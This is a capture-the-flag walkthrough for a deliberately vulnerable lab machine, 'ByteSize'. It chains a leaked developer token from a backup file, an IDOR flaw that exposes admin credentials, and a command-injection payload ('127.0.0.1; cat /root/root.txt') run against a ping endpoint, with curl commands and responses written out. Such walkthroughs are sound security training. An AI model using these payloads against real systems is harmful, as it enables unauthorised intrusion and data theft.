# ByteSize Lab - Detailed Solution Walkthrough

This document outlines the step-by-step solution for the **ByteSize** vulnerable machine, following a linear 3-phase attack chain.

---

## 🕵️ Phase 1: Information Gathering (Developer Token Leak)

### The Objective
Identify exposed endpoints or backup files to gain an initial foothold.

### The Attack
1. When browsing the ByteSize snippet portal, standard reconnaissance techniques (like directory busting with `gobuster` or `ffuf`) will quickly reveal a hidden backup file named `config.json.bak` located at the root of the web server.
2. Navigate to `http://<TARGET_IP>/config.json.bak` in your browser, or fetch it using `curl`:
   ```bash
   curl -s http://<TARGET_IP>/config.json.bak
   ```
3. The response reveals a highly privileged internal Developer Token:
   ```json
   {
     "environment": "production",
     "api_version": "v1.0",
     "BYTESIZE_DEV_TOKEN": "DevToken_REDACTED",
     "feature_flags": {
       "enable_admin_portal": true
     }
   }
   ```
4. **Token Captured**: `DevToken_REDACTED`

---

## 🔓 Phase 2: Insecure Direct Object Reference (IDOR)

### The Objective
Utilize the leaked token to query the API and access confidential internal notes.

### The Attack
1. The application fetches notes dynamically using an API endpoint: `/api/notes/view?id=X`.
2. Public notes (like IDs 102 and 103) are accessible to anyone. However, private notes throw a `403 Access Forbidden` error unless you provide the Developer Token via the `X-Dev-Token` HTTP header.
3. The API properly verifies the token, but it suffers from an **IDOR vulnerability**: it does not verify if the token owner is specifically authorized to read that exact note, allowing any valid token to read *all* notes.
4. Iterate downward through Note IDs. Query Note `100` using the leaked token:
   ```bash
   curl -s -H "X-Dev-Token: DevToken_REDACTED" http://<TARGET_IP>/api/notes/view?id=100
   ```
5. The API returns the highly confidential IT Admin Note, which contains the first flag and administrative credentials:
   ```json
   {
     "id": 100,
     "title": "[CONFIDENTIAL] IT Admin Systems Credentials",
     "content": "Admin Login Page: http://bytesize.vulnos/admin/maintenance\nCredentials:\nUsername: admin\nPassword: Admin_Pass_2026!\n\nUser Flag: VulnOS{REDACTED}\n\nNote: Please update the firewall rules to block external access to MongoDB database (port 27017). Currently listening on localhost only but let's make sure.",
     "author": "IT Administrator",
     "isPrivate": true
   }
   ```
6. **User Flag Captured**: `VulnOS{REDACTED}`
7. **Credentials Captured**: `admin` / `Admin_Pass_2026!`

---

## 💥 Phase 3: Command Injection (Root Compromise)

### The Objective
Leverage the administrative credentials to achieve Remote Code Execution (RCE) and retrieve the final Root Flag.

### The Attack
1. The private note revealed a hidden maintenance portal at `/admin/maintenance`.
2. Accessing this endpoint prompts for Basic Authentication. Use the credentials obtained in Phase 2 (`admin`:`Admin_Pass_2026!`).
3. The page reveals an "Internal Diagnostics Tool" that pings a given IP address. Looking at the network requests, it posts JSON to `/api/admin/ping`:
   ```json
   {
     "host": "127.0.0.1"
   }
   ```
4. This utility is vulnerable to **Command Injection**. Because the backend executes the ping command in a system shell without sanitizing the input, we can append our own bash commands using a semicolon (`;`).
5. Since the Node application runs as `root` (to facilitate this specific lab's linear design), we can directly read the root flag.
6. Inject the payload `127.0.0.1; cat /root/root.txt` by sending the following POST request:
   ```bash
   curl -s -X POST \
     -H "Content-Type: application/json" \
     -H "Authorization: Basic YWRtaW46QWRtaW5fUGFzc18yMDI2IQ==" \
     -d '{"host":"127.0.0.1; cat /root/root.txt"}' \
     http://<TARGET_IP>/api/admin/ping
   ```
   *(Note: `YWRtaW46QWRtaW5fUGFzc18yMDI2IQ==` is the Base64 encoding of `admin:Admin_Pass_2026!`)*
7. The server executes the ping command, followed by the `cat` command, returning the final flag in the JSON output:
   ```json
   {
     "command": "ping -c 3 127.0.0.1; cat /root/root.txt",
     "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n...\nVulnOS{REDACTED}\n",
     "success": true
   }
   ```
8. **Root Flag Captured**: `VulnOS{REDACTED}`

---
**Lab Complete!**
